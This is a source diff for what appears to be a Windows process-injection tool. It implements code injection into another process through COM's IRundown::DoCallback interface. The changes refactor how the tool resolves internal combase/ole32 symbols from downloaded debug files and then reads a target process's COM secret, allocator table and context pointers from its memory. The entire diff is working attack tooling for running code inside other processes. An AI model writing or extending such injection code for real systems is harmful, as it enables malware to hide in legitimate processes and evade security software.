@@ -8,6 +8,8 @@
 #include "common.h"
 #include "hash.h"
 #include "pdb.h"
+#include "fs.h"
+
 #include "scripts.h"
 
 #include "rpc/rundown.h"
@@ -121,6 +123,18 @@ struct ipid_entry_t {
 IRundownPtr
 ConnectToIRundown(OID oid, OXID oxid, IPID ipid) {
 
+    static bool com_initialized = false;
+    if (!com_initialized) {
+
+        HRESULT hr = CoInitialize(nullptr);
+        if (FAILED(hr)) {
+            wprintf(L"  [-] unable to initialize COM, HRESULT = 0x%x\n", hr);
+            return false;
+        }
+
+        com_initialized = true;
+    }
+
     OBJREF objRef = { 0 };
 
     objRef.signature = OBJREF_SIGNATURE;
@@ -171,45 +185,59 @@ bool inject_com_irundown_docallback(uint32_t pid, RemoteProcessMemoryMethod meth
     wchar_t folder_path[MAX_PATH];
     GetTempPathW(MAX_PATH, folder_path);
 
-    auto *combase_module = (PVOID)GetModuleHandleA("combase");
+    auto *com_dll = (PVOID)GetModuleHandleA("combase");
+    if (!com_dll) {
+        com_dll = (PVOID)GetModuleHandleA("ole32");
+    }
 
-    auto combase_pdb_path = pdb::download_pdb(combase_module, folder_path);
-    if (combase_pdb_path.empty()) {
-        wprintf(L"  [-] unable download PDB for combase module");
+    if (!com_dll) {
+        wprintf(L"  [-] unable to get COM DLL handle");
         return false;
     }
 
-    size_t ole32_secret_rva = pdb::get_symbol_rva(combase_pdb_path, L"CProcessSecret::s_guidOle32Secret");
-    if (ole32_secret_rva == 0) {
-        wprintf(L"  [-] unable to get RVA of CProcessSecret::s_guidOle32Secret");
+    auto com_dll_pdb_path = pdb::download_pdb(com_dll, folder_path);
+    if (com_dll_pdb_path.empty()) {
+        wprintf(L"  [-] unable download PDB for COM DLL");
         return false;
     }
 
-    wprintf(L"  [+] RVA of CProcessSecret::s_guidOle32Secret = 0x%zx\n", ole32_secret_rva);
+    size_t ole32_secret_rva;
+    size_t ole32_palloc_rva;
+    size_t ole32_emptyctx_rva;
+    size_t moxid_offset;
 
-    size_t ole32_palloc_rva = pdb::get_symbol_rva(combase_pdb_path, L"CIPIDTable::_palloc");
-    if (ole32_palloc_rva == 0) {
-        wprintf(L"  [-] unable to get RVA of CIPIDTable::_palloc");
-        return false;
+    {
+        auto pdb_mapping = fs::map_file(com_dll_pdb_path.c_str());
+        if (pdb_mapping.handle == NULL) {
+            return false;
+        }
+
+        if (!pdb::get_symbol_rva(ole32_secret_rva, pdb_mapping.data, "CProcessSecret::s_guidOle32Secret")) {
+            return false;
+        }
+
+        wprintf(L"  [+] RVA of CProcessSecret::s_guidOle32Secret = 0x%zx\n", ole32_secret_rva);
+
+        if (!pdb::get_symbol_rva(ole32_palloc_rva, pdb_mapping.data, "CIPIDTable::_palloc")) {
+            return false;
+        }
+
+        wprintf(L"  [+] RVA of CIPIDTable::_palloc = 0x%zx\n", ole32_palloc_rva);
+
+        if (!pdb::get_symbol_rva(ole32_emptyctx_rva, pdb_mapping.data, "g_pMTAEmptyCtx")) {
+            return false;
+        }
+
+        wprintf(L"  [+] RVA of g_pMTAEmptyCtx = 0x%zx\n", ole32_emptyctx_rva);
+
+        if (!pdb::get_field_offset(moxid_offset, pdb_mapping.data, "OXIDEntry", "_moxid")) {
+            return false;
+        }
+
+        wprintf(L"  [+] offset of OXIDEntry::_moxid field = 0x%zx\n", moxid_offset);
+
+        sysapi::SectionUnmapView(pdb_mapping.data);
     }
-
-    wprintf(L"  [+] RVA of CIPIDTable::_palloc = 0x%zx\n", ole32_palloc_rva);
-
-    size_t ole32_emptyctx_rva = pdb::get_symbol_rva(combase_pdb_path, L"");
-    if (ole32_emptyctx_rva == 0) {
-        wprintf(L"  [-] unable to get RVA of g_pMTAEmptyCtx");
-        return false;
-    }
-
-    wprintf(L"  [+] RVA of g_pMTAEmptyCtx = 0x%zx\n", ole32_emptyctx_rva);
-
-    size_t moxid_offset = pdb::get_field_offset(combase_pdb_path, L"OXIDEntry", L"_moxid");
-    if (moxid_offset == 0) {
-        wprintf(L"  [-] unable to get offset of _moxid field in OXIDEntry\n");
-        return false;
-    }
-
-    wprintf(L"  [+] offset of OXIDEntry::_moxid field = 0x%zx\n", moxid_offset);
 
     RemoteProcessMemoryContext ctx;
     ctx.method = method;
@@ -218,7 +246,7 @@ bool inject_com_irundown_docallback(uint32_t pid, RemoteProcessMemoryMethod meth
     ctx.Size = (ULONG)sizeof(CPageAllocator);
 
     CPageAllocator palloc;
-    res = process_read_memory(ctx, (size_t)PTR_ADD(combase_module, ole32_palloc_rva), &palloc, sizeof(CPageAllocator));
+    res = process_read_memory(ctx, (size_t)PTR_ADD(com_dll, ole32_palloc_rva), &palloc, sizeof(CPageAllocator));
     if (!res) {
         return false;
     }
@@ -355,7 +383,7 @@ bool inject_com_irundown_docallback(uint32_t pid, RemoteProcessMemoryMethod meth
             if (GlobalCtxAddr == NULL) {
 
                 ctx.Size = (ULONG)sizeof(PVOID);
-                res = process_read_memory(ctx, (size_t)PTR_ADD(combase_module, ole32_emptyctx_rva), &GlobalCtxAddr, sizeof(PVOID));
+                res = process_read_memory(ctx, (size_t)PTR_ADD(com_dll, ole32_emptyctx_rva), &GlobalCtxAddr, sizeof(PVOID));
                 if (!res) {
                     return false;
                 }
@@ -376,7 +404,7 @@ bool inject_com_irundown_docallback(uint32_t pid, RemoteProcessMemoryMethod meth
 
         if (Ole32Secret == IID_NULL) {
 
-            res = process_read_memory(ctx, (size_t)PTR_ADD(combase_module, ole32_secret_rva), &Ole32Secret, sizeof(Ole32Secret));
+            res = process_read_memory(ctx, (size_t)PTR_ADD(com_dll, ole32_secret_rva), &Ole32Secret, sizeof(Ole32Secret));
             if (!res) {
                 return false;
             }
@@ -386,7 +414,7 @@ bool inject_com_irundown_docallback(uint32_t pid, RemoteProcessMemoryMethod meth
                 wprintf(L"  [*] CProcessSecret::s_guidOle32Secret = %s, invoking IRundown::DoCallback() with invalid secret to init...\n", str::to_wstring(Ole32Secret).c_str());
                 irundown->DoCallback(&params);
 
-                res = process_read_memory(ctx, (size_t)PTR_ADD(combase_module, ole32_secret_rva), &Ole32Secret, sizeof(Ole32Secret));
+                res = process_read_memory(ctx, (size_t)PTR_ADD(com_dll, ole32_secret_rva), &Ole32Secret, sizeof(Ole32Secret));
                 if (!res) {
                     return false;
                 }
